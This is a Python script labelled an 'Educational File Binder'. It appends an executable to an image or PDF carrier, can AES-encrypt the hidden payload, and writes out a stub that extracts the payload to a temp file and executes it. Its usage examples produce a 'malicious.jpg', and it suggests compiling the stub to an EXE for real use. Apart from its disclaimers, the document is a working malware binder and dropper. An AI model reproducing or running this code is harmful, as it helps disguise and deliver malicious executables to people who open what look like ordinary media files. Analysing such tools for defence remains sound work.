#!/usr/bin/python3
"""
Educational File Binder - For authorized security testing only
Demonstrates how to append an executable to a media file
"""

import sys
import os
import struct
import hashlib
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

class FileBinder:
    def __init__(self):
        self.marker = b"BNDR"  # 4-byte marker to identify bound file
        self.version = 1
        
    def bind_files(self, carrier_file, payload_file, output_file, encrypt=False):
        """
        Bind payload to carrier file
        
        Args:
            carrier_file: The innocent-looking file (jpg, pdf, etc.)
            payload_file: The executable to hide
            output_file: Output bound file
            encrypt: Whether to encrypt the payload
        """
        
        # Validate files
        if not os.path.exists(carrier_file):
            raise FileNotFoundError(f"Carrier file not found: {carrier_file}")
        if not os.path.exists(payload_file):
            raise FileNotFoundError(f"Payload file not found: {payload_file}")
            
        print(f"📁 Binding files...")
        print(f"   Carrier: {carrier_file}")
        print(f"   Payload: {payload_file}")
        print(f"   Output:  {output_file}")
        
        # Read files
        with open(carrier_file, 'rb') as f:
            carrier_data = f.read()
            
        with open(payload_file, 'rb') as f:
            payload_data = f.read()
        
        # Optional encryption
        if encrypt:
            print("   🔐 Encrypting payload...")
            payload_data, key = self._encrypt_payload(payload_data)
            print(f"   Encryption key: {key[:16]}...")
        else:
            key = None
            
        # Create bound file structure
        bound_data = self._create_bound_file(carrier_data, payload_data, key)
        
        # Write output
        with open(output_file, 'wb') as f:
            f.write(bound_data)
            
        # Verify
        output_size = os.path.getsize(output_file)
        print(f"\n✅ Binding complete!")
        print(f"   Original carrier: {len(carrier_data):,} bytes")
        print(f"   Payload: {len(payload_data):,} bytes")
        print(f"   Bound file: {output_size:,} bytes")
        print(f"   Marker added at offset: {len(carrier_data):,}")
        
        return output_file
    
    def _encrypt_payload(self, payload_data):
        """Encrypt payload with AES-CTR"""
        key = secrets.token_bytes(32)  # 256-bit key
        iv = secrets.token_bytes(16)   # 128-bit IV
        
        cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(payload_data) + encryptor.finalize()
        
        # Return: IV + encrypted + key (for demo)
        return iv + encrypted, key.hex()
    
    def _create_bound_file(self, carrier, payload, key=None):
        """Create bound file structure"""
        
        # Structure:
        # 1. Original carrier file
        # 2. 4-byte marker "BNDR"
        # 3. 4-byte payload size (little-endian)
        # 4. 4-byte version
        # 5. Payload data
        # 6. (Optional) 64-byte SHA256 of payload
        # 7. (Optional) encryption flag and key
        
        payload_size = len(payload)
        version = self.version
        
        # Calculate checksum
        checksum = hashlib.sha256(payload).digest()
        
        # Create bound data
        bound_data = carrier
        bound_data += self.marker
        bound_data += struct.pack('<I', payload_size)  # 4-byte size
        bound_data += struct.pack('<I', version)       # 4-byte version
        bound_data += struct.pack('<I', 1 if key else 0)  # Encryption flag
        bound_data += payload
        bound_data += checksum
        
        # Add key if encrypted (for demo - in real use, don't store key!)
        if key:
            bound_data += key.encode('utf-8')
            
        return bound_data
    
    def extract_payload(self, bound_file, output_file=None):
        """
        Extract payload from bound file (for analysis)
        """
        with open(bound_file, 'rb') as f:
            data = f.read()
        
        # Find marker
        marker_pos = data.find(self.marker)
        if marker_pos == -1:
            raise ValueError("Not a bound file (marker not found)")
            
        print(f"📦 Found bound file marker at offset: {marker_pos:,}")
        
        # Read metadata
        offset = marker_pos + 4  # Skip marker
        payload_size = struct.unpack('<I', data[offset:offset+4])[0]
        offset += 4
        version = struct.unpack('<I', data[offset:offset+4])[0]
        offset += 4
        encrypted_flag = struct.unpack('<I', data[offset:offset+4])[0]
        offset += 4
        
        # Read payload
        payload = data[offset:offset+payload_size]
        offset += payload_size
        
        # Read checksum
        expected_checksum = data[offset:offset+32]
        offset += 32
        
        # Verify checksum
        actual_checksum = hashlib.sha256(payload).digest()
        if expected_checksum != actual_checksum:
            print("⚠️  Warning: Payload checksum mismatch!")
        
        # Read key if encrypted
        key = None
        if encrypted_flag:
            key = data[offset:offset+64].decode('utf-8')
            print(f"   Encrypted with key: {key[:16]}...")
            
            # Decrypt
            iv = payload[:16]
            ciphertext = payload[16:]
            
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            cipher = Cipher(algorithms.AES(bytes.fromhex(key)), modes.CTR(iv))
            decryptor = cipher.decryptor()
            payload = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Save or return
        if output_file:
            with open(output_file, 'wb') as f:
                f.write(payload)
            print(f"✅ Payload extracted to: {output_file}")
            print(f"   Size: {len(payload):,} bytes")
        
        return payload, key

def create_stub_extractor(carrier_type="jpg"):
    """
    Create a stub that extracts and executes the payload
    This is a CONCEPTUAL example
    """
    
    stub_code = f'''#!/usr/bin/python3
# Stub extractor - Educational purposes only
# This would be compiled to EXE for Windows

import os
import sys
import struct
import hashlib
import tempfile
import subprocess

MARKER = b"BNDR"

def extract_and_execute(bound_file):
    with open(bound_file, 'rb') as f:
        data = f.read()
    
    # Find payload
    pos = data.find(MARKER)
    if pos == -1:
        return False
    
    # Skip marker and read size
    pos += 4
    payload_size = struct.unpack('<I', data[pos:pos+4])[0]
    pos += 8  # Skip size and version
    encrypted_flag = struct.unpack('<I', data[pos:pos+4])[0]
    pos += 4
    
    # Read payload
    payload = data[pos:pos+payload_size]
    
    # If encrypted, decrypt (key would be hardcoded or retrieved)
    if encrypted_flag:
        # Decryption logic here
        pass
    
    # Write to temp file
    temp_dir = tempfile.gettempdir()
    temp_exe = os.path.join(temp_dir, "tmp_payload.exe")
    
    with open(temp_exe, 'wb') as f:
        f.write(payload)
    
    # Execute
    os.chmod(temp_exe, 0o755)  # Make executable
    subprocess.Popen([temp_exe], shell=True)
    
    return True

if __name__ == "__main__":
    # Get path to self
    self_path = sys.argv[0]
    extract_and_execute(self_path)
'''
    
    return stub_code

def main():
    print("📁 Educational File Binder")
    print("=" * 50)
    print("For authorized security testing only!")
    print("\nUsage modes:")
    print("  1. Bind:    python3 binder.py bind <carrier> <payload> <output>")
    print("  2. Extract: python3 binder.py extract <boundfile> <output>")
    print("  3. Stub:    python3 binder.py stub <carrier_type>")
    print("\nExamples:")
    print("  python3 binder.py bind image.jpg payload.exe malicious.jpg")
    print("  python3 binder.py extract malicious.jpg extracted.exe")
    
    if len(sys.argv) < 2:
        sys.exit(1)
    
    mode = sys.argv[1]
    binder = FileBinder()
    
    if mode == "bind":
        if len(sys.argv) < 5:
            print("Usage: binder.py bind <carrier> <payload> <output>")
            sys.exit(1)
        
        carrier = sys.argv[2]
        payload = sys.argv[3]
        output = sys.argv[4]
        
        # Ask about encryption
        encrypt = input("Encrypt payload? (y/n): ").lower() == 'y'
        
        binder.bind_files(carrier, payload, output, encrypt)
        
    elif mode == "extract":
        if len(sys.argv) < 4:
            print("Usage: binder.py extract <boundfile> <output>")
            sys.exit(1)
        
        bound_file = sys.argv[2]
        output = sys.argv[3]
        
        binder.extract_payload(bound_file, output)
        
    elif mode == "stub":
        carrier_type = sys.argv[2] if len(sys.argv) > 2 else "jpg"
        stub = create_stub_extractor(carrier_type)
        
        with open("extractor_stub.py", "w") as f:
            f.write(stub)
        
        print("✅ Stub extractor created: extractor_stub.py")
        print("Note: This is a Python stub. For real use, compile to EXE.")
        
    else:
        print(f"Unknown mode: {mode}")

if __name__ == "__main__":
    main()
